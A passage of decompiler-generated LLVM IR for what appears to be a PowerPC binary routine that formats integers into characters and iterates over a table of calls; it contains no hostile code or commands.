  store i1 %v1_1000d1e4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d1e4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d1e4, label %dec_label_pc_1000d214, label %dec_label_pc_1000d1ec

dec_label_pc_1000d1ec:                            ; preds = %dec_label_pc_1000d1e4
  %v0_1000d1ec = load i32, i32* %r30.global-to-local, align 4
  %v1_1000d1ec = icmp slt i32 %v0_1000d1ec, 0
  %v3_1000d1ec = icmp eq i32 %v0_1000d1ec, 0
  store i1 %v1_1000d1ec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d1ec, i1* %cr7_eq.global-to-local, align 1
  %tmp79 = icmp slt i32 %v0_1000d1ec, 1
  br i1 %tmp79, label %dec_label_pc_1000d214, label %dec_label_pc_1000d1f4

dec_label_pc_1000d1f4:                            ; preds = %dec_label_pc_1000d1dc, %dec_label_pc_1000d1d0, %dec_label_pc_1000d1ec
  %v2_1000d1fc = inttoptr i32 %v1_1000d1fc to i32*
  store i32 112, i32* %v2_1000d1fc, align 4
  store i32 ptrtoint (i32* @global_var_10013860.648 to i32), i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1000d208 = load i32, i32* @r8, align 4
  %v2_1000d208 = add i32 %v1_1000d208, 8
  %v3_1000d208 = inttoptr i32 %v2_1000d208 to i32*
  store i32 ptrtoint (i32* @global_var_10013860.648 to i32), i32* %v3_1000d208, align 4
  %v0_1000d20c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d20c = load i32, i32* @r8, align 4
  %v2_1000d20c = add i32 %v1_1000d20c, 4
  %v3_1000d20c = inttoptr i32 %v2_1000d20c to i32*
  store i32 %v0_1000d20c, i32* %v3_1000d20c, align 4
  %v0_1000d210 = load i32, i32* @r8, align 4
  %v1_1000d210 = add i32 %v0_1000d210, 12
  store i32 %v1_1000d210, i32* @r8, align 4
  br label %dec_label_pc_1000d214

dec_label_pc_1000d214:                            ; preds = %dec_label_pc_1000d1ec, %dec_label_pc_1000d1e4, %dec_label_pc_1000d1f4
  %v1_1000d224 = phi i32 [ %v1_1000d1fc, %dec_label_pc_1000d1ec ], [ %v1_1000d1fc, %dec_label_pc_1000d1e4 ], [ %v1_1000d210, %dec_label_pc_1000d1f4 ]
  %v0_1000d214 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d214 = add i32 %v0_1000d214, 1
  store i32 %v1_1000d214, i32* %r10.global-to-local, align 4
  %v4_1000d214 = icmp eq i32 %v1_1000d214, 0
  br i1 %v4_1000d214, label %dec_label_pc_1000d23c, label %dec_label_pc_1000d21c

dec_label_pc_1000d21c:                            ; preds = %dec_label_pc_1000d214
  %v1_1000d21c = sub i32 -1, %v0_1000d214
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_1000d224 = add i32 %v1_1000d224, 4
  %v3_1000d224 = inttoptr i32 %v2_1000d224 to i32*
  store i32 %v1_1000d21c, i32* %v3_1000d224, align 4
  store i32 ptrtoint (i32* @global_var_10013853.647 to i32), i32* %r9.global-to-local, align 4
  %v0_1000d230 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d230 = load i32, i32* @r8, align 4
  %v2_1000d230 = inttoptr i32 %v1_1000d230 to i32*
  store i32 %v0_1000d230, i32* %v2_1000d230, align 4
  %v0_1000d234 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d234 = load i32, i32* @r8, align 4
  %v2_1000d234 = add i32 %v1_1000d234, 8
  %v3_1000d234 = inttoptr i32 %v2_1000d234 to i32*
  store i32 %v0_1000d234, i32* %v3_1000d234, align 4
  %v0_1000d238 = load i32, i32* @r8, align 4
  %v1_1000d238 = add i32 %v0_1000d238, 12
  store i32 %v1_1000d238, i32* @r8, align 4
  br label %dec_label_pc_1000d23c

dec_label_pc_1000d23c:                            ; preds = %dec_label_pc_1000d214, %dec_label_pc_1000d21c
  %v1_1000d248 = phi i32 [ %v1_1000d224, %dec_label_pc_1000d214 ], [ %v1_1000d238, %dec_label_pc_1000d21c ]
  %v0_1000d23c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d23c = icmp slt i32 %v0_1000d23c, 0
  %v3_1000d23c = icmp eq i32 %v0_1000d23c, 0
  store i1 %v1_1000d23c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d23c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d23c, label %dec_label_pc_1000d258, label %dec_label_pc_1000d244

dec_label_pc_1000d244:                            ; preds = %dec_label_pc_1000d23c
  store i32 112, i32* %r0.global-to-local, align 4
  %v0_1000d248 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000d248 = add i32 %v1_1000d248, 8
  %v3_1000d248 = inttoptr i32 %v2_1000d248 to i32*
  store i32 %v0_1000d248, i32* %v3_1000d248, align 4
  %v0_1000d24c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d24c = load i32, i32* @r8, align 4
  %v2_1000d24c = inttoptr i32 %v1_1000d24c to i32*
  store i32 %v0_1000d24c, i32* %v2_1000d24c, align 4
  %v0_1000d250 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d250 = load i32, i32* @r8, align 4
  %v2_1000d250 = add i32 %v1_1000d250, 4
  %v3_1000d250 = inttoptr i32 %v2_1000d250 to i32*
  store i32 %v0_1000d250, i32* %v3_1000d250, align 4
  %v0_1000d254 = load i32, i32* @r8, align 4
  %v1_1000d254 = add i32 %v0_1000d254, 12
  store i32 %v1_1000d254, i32* @r8, align 4
  br label %dec_label_pc_1000d258

dec_label_pc_1000d258:                            ; preds = %dec_label_pc_1000d23c, %dec_label_pc_1000d244
  %v1_1000d280 = phi i32 [ %v1_1000d248, %dec_label_pc_1000d23c ], [ %v1_1000d254, %dec_label_pc_1000d244 ]
  %v0_1000d258 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000d258 = icmp slt i32 %v0_1000d258, 103
  %v3_1000d258 = icmp eq i32 %v0_1000d258, 103
  store i1 %v1_1000d258, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d258, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d258, label %dec_label_pc_1000d260, label %dec_label_pc_1000d26c

dec_label_pc_1000d260:                            ; preds = %dec_label_pc_1000d258
  %v3_1000d260 = load i32, i32* %v2_1000cda0, align 4
  store i32 %v3_1000d260, i32* %r0.global-to-local, align 4
  %v1_1000d264 = and i32 %v3_1000d260, 16
  store i32 %v1_1000d264, i32* %r9.global-to-local, align 4
  %v3_1000d264 = icmp eq i32 %v1_1000d264, 0
  br i1 %v3_1000d264, label %dec_label_pc_1000d298, label %dec_label_pc_1000d26c

dec_label_pc_1000d26c:                            ; preds = %dec_label_pc_1000d258, %dec_label_pc_1000d260
  %v0_1000d26c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d26c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000d26c = sub i32 %v1_1000d26c, %v0_1000d26c
  store i32 %v2_1000d26c, i32* %r9.global-to-local, align 4
  %v1_1000d270 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000d270 = icmp sgt i32 %v1_1000d270, %v2_1000d26c
  %v4_1000d270 = icmp eq i32 %v1_1000d270, %v2_1000d26c
  store i1 %v2_1000d270, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000d270, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000d270, label %dec_label_pc_1000d278, label %dec_label_pc_1000d298

dec_label_pc_1000d278:                            ; preds = %dec_label_pc_1000d26c
  %v2_1000d278 = sub i32 %v1_1000d270, %v2_1000d26c
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_1000d280 = add i32 %v1_1000d280, 4
  %v3_1000d280 = inttoptr i32 %v2_1000d280 to i32*
  store i32 %v2_1000d278, i32* %v3_1000d280, align 4
  store i32 ptrtoint (i32* @global_var_10013853.647 to i32), i32* %r9.global-to-local, align 4
  %v0_1000d28c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d28c = load i32, i32* @r8, align 4
  %v2_1000d28c = inttoptr i32 %v1_1000d28c to i32*
  store i32 %v0_1000d28c, i32* %v2_1000d28c, align 4
  %v0_1000d290 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d290 = load i32, i32* @r8, align 4
  %v2_1000d290 = add i32 %v1_1000d290, 8
  %v3_1000d290 = inttoptr i32 %v2_1000d290 to i32*
  store i32 %v0_1000d290, i32* %v3_1000d290, align 4
  %v0_1000d294 = load i32, i32* @r8, align 4
  %v1_1000d294 = add i32 %v0_1000d294, 12
  store i32 %v1_1000d294, i32* @r8, align 4
  br label %dec_label_pc_1000d298

dec_label_pc_1000d298:                            ; preds = %dec_label_pc_1000d26c, %dec_label_pc_1000d260, %dec_label_pc_1000d278
  %v1_1000d32c37 = phi i32 [ %v1_1000d280, %dec_label_pc_1000d26c ], [ %v1_1000d280, %dec_label_pc_1000d260 ], [ %v1_1000d294, %dec_label_pc_1000d278 ]
  %v0_1000d298 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d298 = icmp slt i32 %v0_1000d298, 102
  %v3_1000d298 = icmp eq i32 %v0_1000d298, 102
  store i1 %v1_1000d298, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d298, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d298, label %dec_label_pc_1000d320, label %dec_label_pc_1000d2a0

dec_label_pc_1000d2a0:                            ; preds = %dec_label_pc_1000d298
  %v0_1000d2a0 = load i32, i32* @r7, align 4
  %v1_1000d2a0 = icmp slt i32 %v0_1000d2a0, 0
  %v3_1000d2a0 = icmp eq i32 %v0_1000d2a0, 0
  store i1 %v1_1000d2a0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d2a0, i1* %cr7_eq.global-to-local, align 1
  store i32 %stack_var_-194.0, i32* %r5.global-to-local, align 4
  store i32 %v0_1000d2a0, i32* %r11.global-to-local, align 4
  store i32 43, i32* %r4.global-to-local, align 4
  %tmp80 = icmp sgt i32 %v0_1000d2a0, -1
  br i1 %tmp80, label %dec_label_pc_1000d2bc, label %dec_label_pc_1000d2b4

dec_label_pc_1000d2b4:                            ; preds = %dec_label_pc_1000d2a0
  %v1_1000d2b4 = sub i32 0, %v0_1000d2a0
  store i32 %v1_1000d2b4, i32* %r11.global-to-local, align 4
  store i32 45, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d2bc

dec_label_pc_1000d2bc:                            ; preds = %dec_label_pc_1000d2a0, %dec_label_pc_1000d2b4
  %v0_1000d2d031 = phi i32 [ %v0_1000d2a0, %dec_label_pc_1000d2a0 ], [ %v1_1000d2b4, %dec_label_pc_1000d2b4 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000d2c0 = ptrtoint i32* %stack_var_-179 to i32
  store i32 %v2_1000d2c0, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-179, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  store i32 10, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000d2d0

dec_label_pc_1000d2d0:                            ; preds = %dec_label_pc_1000d2d0.backedge, %dec_label_pc_1000d2bc
  %v2_1000d2f0 = phi i32 [ %v3_1000d2f0, %dec_label_pc_1000d2d0.backedge ], [ %v2_1000d2c0, %dec_label_pc_1000d2bc ]
  %v0_1000d2d4 = phi i32 [ %v0_1000d2d4.pre, %dec_label_pc_1000d2d0.backedge ], [ 2, %dec_label_pc_1000d2bc ]
  %v1_1000d2d0 = phi i32 [ %v1_1000d2d0.pre, %dec_label_pc_1000d2d0.backedge ], [ 10, %dec_label_pc_1000d2bc ]
  %v1_1000d2e4 = phi i32 [ %v0_1000d2d0.pre, %dec_label_pc_1000d2d0.backedge ], [ %v0_1000d2d031, %dec_label_pc_1000d2bc ]
  %v2_1000d2d0 = sdiv i32 %v1_1000d2e4, %v1_1000d2d0
  store i32 %v2_1000d2d0, i32* %r0.global-to-local, align 4
  %v1_1000d2d4 = add i32 %v0_1000d2d4, 1
  store i32 %v1_1000d2d4, i32* @r7, align 4
  %v1_1000d2d8 = icmp slt i32 %v1_1000d2d4, 3
  %v3_1000d2d8 = icmp eq i32 %v1_1000d2d4, 3
  store i1 %v1_1000d2d8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d2d8, i1* %cr7_eq.global-to-local, align 1
  %v1_1000d2e0 = icmp slt i32 %v2_1000d2d0, 0
  %v2_1000d2e0 = icmp sgt i32 %v2_1000d2d0, 0
  %v3_1000d2e0 = icmp eq i32 %v2_1000d2d0, 0
  store i1 %v1_1000d2e0, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1000d2e0, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1000d2e0, i1* %cr6_eq.global-to-local, align 1
  %tmp81 = mul i32 %v2_1000d2d0, -10
  store i32 %v2_1000d2d0, i32* %r11.global-to-local, align 4
  %v2_1000d2e4 = add i32 %v1_1000d2e4, 48
  %v1_1000d2ec = add i32 %v2_1000d2e4, %tmp81
  store i32 %v1_1000d2ec, i32* %r9.global-to-local, align 4
  %v1_1000d2f0 = trunc i32 %v1_1000d2ec to i8
  %v3_1000d2f0 = add i32 %v2_1000d2f0, -1
  %v4_1000d2f0 = inttoptr i32 %v3_1000d2f0 to i8*
  store i8 %v1_1000d2f0, i8* %v4_1000d2f0, align 1
  store i32 %v3_1000d2f0, i32* %r10.global-to-local, align 4
  %v0_1000d2f4 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_1000d2f4 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_1000d2f4 = or i1 %v0_1000d2f4, %v1_1000d2f4
  br i1 %v2_1000d2f4, label %dec_label_pc_1000d2d0.backedge, label %dec_label_pc_1000d2f8

dec_label_pc_1000d2d0.backedge:                   ; preds = %dec_label_pc_1000d2d0, %dec_label_pc_1000d2f8
  %v0_1000d2d0.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d2d0.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_1000d2d4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1000d2d0

dec_label_pc_1000d2f8:                            ; preds = %dec_label_pc_1000d2d0
  %v0_1000d2f8 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_1000d2f8, label %dec_label_pc_1000d2fc, label %dec_label_pc_1000d2d0.backedge

dec_label_pc_1000d2fc:                            ; preds = %dec_label_pc_1000d2f8
  %v1_1000d2fc = add i32 %v2_1000d2f0, -2
  store i32 %v1_1000d2fc, i32* %r9.global-to-local, align 4
  store i32 112, i32* %r0.global-to-local, align 4
  %v1_1000d304 = add i32 %v2_1000d2f0, -3
  store i32 %v1_1000d304, i32* %r11.global-to-local, align 4
  %v0_1000d308 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d308 = trunc i32 %v0_1000d308 to i8
  %v4_1000d308 = inttoptr i32 %v1_1000d2fc to i8*
  store i8 %v1_1000d308, i8* %v4_1000d308, align 1
  %v0_1000d30c = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d30c = trunc i32 %v0_1000d30c to i8
  %v2_1000d30c = load i32, i32* %r9.global-to-local, align 4
  %v3_1000d30c = add i32 %v2_1000d30c, -1
  %v4_1000d30c = inttoptr i32 %v3_1000d30c to i8*
  store i8 %v1_1000d30c, i8* %v4_1000d30c, align 1
  %v0_1000d310 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d310 = load i32, i32* @r8, align 4
  %v2_1000d310 = inttoptr i32 %v1_1000d310 to i32*
  store i32 %v0_1000d310, i32* %v2_1000d310, align 4
  %v0_1000d314 = load i32, i32* @r7, align 4
  %v1_1000d314 = load i32, i32* @r8, align 4
  %v2_1000d314 = add i32 %v1_1000d314, 4
  %v3_1000d314 = inttoptr i32 %v2_1000d314 to i32*
  store i32 %v0_1000d314, i32* %v3_1000d314, align 4
  %v0_1000d318 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d318 = load i32, i32* @r8, align 4
  %v2_1000d318 = add i32 %v1_1000d318, 8
  %v3_1000d318 = inttoptr i32 %v2_1000d318 to i32*
  store i32 %v0_1000d318, i32* %v3_1000d318, align 4
  %v0_1000d31c = load i32, i32* @r8, align 4
  %v1_1000d31c = add i32 %v0_1000d31c, 12
  store i32 %v1_1000d31c, i32* @r8, align 4
  br label %dec_label_pc_1000d320

dec_label_pc_1000d320:                            ; preds = %dec_label_pc_1000d298, %dec_label_pc_1000ce74, %dec_label_pc_1000d2fc
  %v0_1000d39c = phi i32 [ %v1_1000d32c37, %dec_label_pc_1000d298 ], [ %v2_1000ce80, %dec_label_pc_1000ce74 ], [ %v1_1000d31c, %dec_label_pc_1000d2fc ]
  %v2_1000d320 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_1000d320, i32* %r9.global-to-local, align 4
  %v1_1000d330.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000d324

dec_label_pc_1000d324:                            ; preds = %dec_label_pc_1000d324, %dec_label_pc_1000d320
  %v1_1000d330 = phi i32 [ %v2_1000d330, %dec_label_pc_1000d324 ], [ %v1_1000d330.pre, %dec_label_pc_1000d320 ]
  %v0_1000d324 = phi i32 [ %v1_1000d328, %dec_label_pc_1000d324 ], [ %v2_1000d320, %dec_label_pc_1000d320 ]
  %v1_1000d324 = inttoptr i32 %v0_1000d324 to i32*
  %v2_1000d324 = load i32, i32* %v1_1000d324, align 4
  store i32 %v2_1000d324, i32* %r0.global-to-local, align 4
  %v1_1000d328 = add i32 %v0_1000d324, 12
  store i32 %v1_1000d328, i32* %r9.global-to-local, align 4
  %v2_1000d32c = icmp ult i32 %v1_1000d328, %v0_1000d39c
  %v2_1000d330 = sub i32 %v1_1000d330, %v2_1000d324
  store i32 %v2_1000d330, i32* @r28, align 4
  br i1 %v2_1000d32c, label %dec_label_pc_1000d324, label %dec_label_pc_1000d338

dec_label_pc_1000d338:                            ; preds = %dec_label_pc_1000d324
  %v4_1000d32c = icmp eq i32 %v1_1000d328, %v0_1000d39c
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000d32c, i1* %cr7_eq.global-to-local, align 1
  %v3_1000d338 = load i8, i8* %stack_var_-200, align 1
  store i32 160, i32* %r10.global-to-local, align 4
  store i32 160, i32* %stack_var_-156, align 4
  store i32 %v0_1000d39c, i32* @r30, align 4
  %tmp85 = icmp sgt i8 %v3_1000d338, 0
  %v1_1000d34c = zext i1 %tmp85 to i32
  store i32 %v1_1000d34c, i32* %r9.global-to-local, align 4
  %v2_1000d350 = ptrtoint i8* %stack_var_-200 to i32
  store i32 %v2_1000d350, i32* %r0.global-to-local, align 4
  %v2_1000d354 = sub i32 %v2_1000d330, %v1_1000d34c
  store i32 %v2_1000d354, i32* %r11.global-to-local, align 4
  %tmp82 = icmp slt i32 %v2_1000d354, 1
  br i1 %tmp82, label %dec_label_pc_1000d3c0, label %dec_label_pc_1000d364

dec_label_pc_1000d364:                            ; preds = %dec_label_pc_1000d338
  %v3_1000d364 = load i32, i32* %v2_1000cda0, align 4
  store i32 %v3_1000d364, i32* %r0.global-to-local, align 4
  %v1_1000d368 = and i32 %v3_1000d364, 8
  store i32 %v1_1000d368, i32* @r7, align 4
  %v3_1000d368 = icmp eq i32 %v1_1000d368, 0
  br i1 %v3_1000d368, label %dec_label_pc_1000d38c, label %dec_label_pc_1000d370

dec_label_pc_1000d370:                            ; preds = %dec_label_pc_1000d364
  %v1_1000d374 = add i32 %v0_1000d39c, 12
  store i32 %v1_1000d374, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_10013853.647 to i32), i32* %r9.global-to-local, align 4
  %v2_1000d37c = inttoptr i32 %v0_1000d39c to i32*
  store i32 160, i32* %v2_1000d37c, align 4
  %v0_1000d380 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d380 = load i32, i32* @r8, align 4
  %v2_1000d380 = add i32 %v1_1000d380, 4
  %v3_1000d380 = inttoptr i32 %v2_1000d380 to i32*
  store i32 %v0_1000d380, i32* %v3_1000d380, align 4
  %v0_1000d384 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d384 = load i32, i32* @r8, align 4
  %v2_1000d384 = add i32 %v1_1000d384, 8
  %v3_1000d384 = inttoptr i32 %v2_1000d384 to i32*
  store i32 %v0_1000d384, i32* %v3_1000d384, align 4
  br label %dec_label_pc_1000d3c0

dec_label_pc_1000d38c:                            ; preds = %dec_label_pc_1000d364
  %v1_1000d38c = add i32 %tmp, 16
  %v2_1000d38c = inttoptr i32 %v1_1000d38c to i32*
  %v3_1000d38c = load i32, i32* %v2_1000d38c, align 4
  store i32 %v3_1000d38c, i32* %r0.global-to-local, align 4
  %v1_1000d390 = icmp slt i32 %v3_1000d38c, 48
  %v3_1000d390 = icmp eq i32 %v3_1000d38c, 48
  store i1 %v1_1000d390, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d390, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d390, label %dec_label_pc_1000d398, label %dec_label_pc_1000d3b4

dec_label_pc_1000d398:                            ; preds = %dec_label_pc_1000d38c
  %v3_1000d398 = load i32, i32* %stack_var_-140, align 4
  store i32 %v0_1000d39c, i32* @r30, align 4
  %v2_1000d3a0 = add i32 %v3_1000d398, %v2_1000d354
  store i32 %v2_1000d3a0, i32* %r0.global-to-local, align 4
  store i32 %v2_1000d3a0, i32* %stack_var_-140, align 4
  br label %dec_label_pc_1000d3c0

dec_label_pc_1000d3ac:                            ; preds = %dec_label_pc_1000d3c8
  store i32 -1, i32* @r29, align 4
  br label %dec_label_pc_1000d3fc

dec_label_pc_1000d3b4:                            ; preds = %dec_label_pc_1000d38c
  store i32 %v2_1000d330, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d39c, i32* @r30, align 4
  br label %dec_label_pc_1000d3c0

dec_label_pc_1000d3c0:                            ; preds = %dec_label_pc_1000d338, %dec_label_pc_1000d398, %dec_label_pc_1000d370, %dec_label_pc_1000d3b4
  store i32 0, i32* @r29, align 4
  %v2_1000d3c4 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_1000d3c4, i32* @r31, align 4
  br label %dec_label_pc_1000d3c8

dec_label_pc_1000d3c8:                            ; preds = %dec_label_pc_1000d3f8, %dec_label_pc_1000d3c0
  %v0_1000d3d8 = phi i32 [ %v1_1000d3e4, %dec_label_pc_1000d3f8 ], [ %v2_1000d3c4, %dec_label_pc_1000d3c0 ]
  %v1_1000d3c8 = inttoptr i32 %v0_1000d3d8 to i32*
  %v2_1000d3c8 = load i32, i32* %v1_1000d3c8, align 4
  store i32 %v2_1000d3c8, i32* %r4.global-to-local, align 4
  %v0_1000d3cc = load i32, i32* @r27, align 4
  store i32 %v0_1000d3cc, i32* %r3.global-to-local, align 4
  %v1_1000d3d0 = add i32 %v0_1000d3d8, 4
  %v2_1000d3d0 = inttoptr i32 %v1_1000d3d0 to i32*
  %v3_1000d3d0 = load i32, i32* %v2_1000d3d0, align 4
  store i32 %v3_1000d3d0, i32* %r5.global-to-local, align 4
  %v0_1000d3d4 = load i32, i32* @r26, align 4
  store i32 %v0_1000d3d4, i32* %ctr.global-to-local, align 4
  %v1_1000d3d8 = add i32 %v0_1000d3d8, 8
  %v2_1000d3d8 = inttoptr i32 %v1_1000d3d8 to i32*
  %v3_1000d3d8 = load i32, i32* %v2_1000d3d8, align 4
  store i32 %v3_1000d3d8, i32* %r6.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_1000d3d4)
  %v0_1000d3e0 = load i32, i32* @r31, align 4
  %v1_1000d3e0 = add i32 %v0_1000d3e0, 4
  %v2_1000d3e0 = inttoptr i32 %v1_1000d3e0 to i32*
  %v3_1000d3e0 = load i32, i32* %v2_1000d3e0, align 4
  store i32 %v3_1000d3e0, i32* %r0.global-to-local, align 4
  %v1_1000d3e4 = add i32 %v0_1000d3e0, 12
  store i32 %v1_1000d3e4, i32* @r31, align 4
  %v0_1000d3e8 = load i32, i32* @r29, align 4
  %v1_1000d3e8 = load i32, i32* %r3.global-to-local, align 4
  %v2_1000d3e8 = add i32 %v1_1000d3e8, %v0_1000d3e8
  store i32 %v2_1000d3e8, i32* @r29, align 4
  %v2_1000d3ec = icmp slt i32 %v1_1000d3e8, %v3_1000d3e0
  %v4_1000d3ec = icmp eq i32 %v1_1000d3e8, %v3_1000d3e0
  store i1 %v2_1000d3ec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000d3ec, i1* %cr7_eq.global-to-local, align 1
  %v1_1000d3f0 = load i32, i32* @r30, align 4
  %v2_1000d3f0 = icmp ult i32 %v1_1000d3e4, %v1_1000d3f0
  %v3_1000d3f0 = icmp ugt i32 %v1_1000d3e4, %v1_1000d3f0
  %v4_1000d3f0 = icmp eq i32 %v1_1000d3e4, %v1_1000d3f0
  store i1 %v2_1000d3f0, i1* %cr6_lt.global-to-local, align 1
  store i1 %v3_1000d3f0, i1* %cr6_gt.global-to-local, align 1
  store i1 %v4_1000d3f0, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_1000d3ec, label %dec_label_pc_1000d3f8, label %dec_label_pc_1000d3ac

dec_label_pc_1000d3f8:                            ; preds = %dec_label_pc_1000d3c8
  br i1 %v2_1000d3f0, label %dec_label_pc_1000d3c8, label %dec_label_pc_1000d3fc

dec_label_pc_1000d3fc:                            ; preds = %dec_label_pc_1000d3f8, %dec_label_pc_1000d3ac
  %v0_1000d400 = phi i32 [ -1, %dec_label_pc_1000d3ac ], [ %v2_1000d3e8, %dec_label_pc_1000d3f8 ]
  store i32 %v0_1000cd50, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d400, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000d400

; uselistorder directives
  uselistorder i32 %v0_1000d400, { 1, 0 }
  uselistorder i32 %v1_1000d3e8, { 2, 1, 0 }
  uselistorder i32 %v1_1000d3e4, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v3_1000d3e0, { 1, 0, 2 }
  uselistorder i32 %v0_1000d3d8, { 0, 2, 1 }
  uselistorder i32 %v3_1000d38c, { 1, 0, 2 }
  uselistorder i32 %v1_1000d34c, { 1, 0 }
  uselistorder i32 %v2_1000d330, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1000d328, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000d324, { 1, 0 }
  uselistorder i32 %v0_1000d39c, { 3, 2, 5, 4, 6, 1, 0 }
  uselistorder i32 %v3_1000d2f0, { 1, 2, 0 }
  uselistorder i32 %v1_1000d2d4, { 1, 0, 2 }
  uselistorder i32 %v2_1000d2d0, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_1000d2a0, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v1_1000d270, { 2, 0, 1 }
  uselistorder i32 %v2_1000d26c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1000d1dc, { 1, 0 }
  uselistorder i32 %v2_1000d140, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_1000d114, { 4, 0, 3, 2, 1 }
  uselistorder i32 %v1_1000d0dc, { 3, 0, 1, 2 }
  uselistorder i32 %v0_1000d0d4, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32 %v2_1000d0a0, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 %v0_1000d090, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_1000d084, { 1, 0, 2 }
  uselistorder i32 %v1_1000d068, { 0, 3, 2, 1 }
  uselistorder i32 %v2_1000d020, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_1000d010, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000cff4, { 1, 0 }
  uselistorder i32 %v1_1000cfd0, { 1, 0 }
  uselistorder i32 %v2_1000cfb0, { 1, 0, 2 }
  uselistorder i32 %v0_1000cf58, { 1, 0 }
  uselistorder i32 %v1_1000cdbc, { 1, 0 }
  uselistorder i32 %v0_1000ce48, { 2, 1, 0 }
  uselistorder i32 %v1_1000cd90, { 1, 0 }
  uselistorder i32 %v1_1000cd70, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 1, 0, 2 }
  uselistorder i32* %stack_var_-177, { 1, 2, 0 }
  uselistorder i32* %stack_var_-120, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-200, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 %tmp, { 2, 4, 1, 3, 0, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 3, 4, 1, 6, 5, 7, 8, 9, 10 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 4, 7, 5, 8, 6, 11, 9, 10, 12, 13, 0 }
  uselistorder i32* %r31.global-to-local, { 2, 3, 4, 5, 0, 6, 1, 7 }
  uselistorder i32* %r30.global-to-local, { 3, 4, 0, 5, 1, 6, 7, 2, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 8, 9, 10, 14, 16, 15, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 10, 8, 11, 14, 12, 13, 15, 16, 17, 19, 18 }
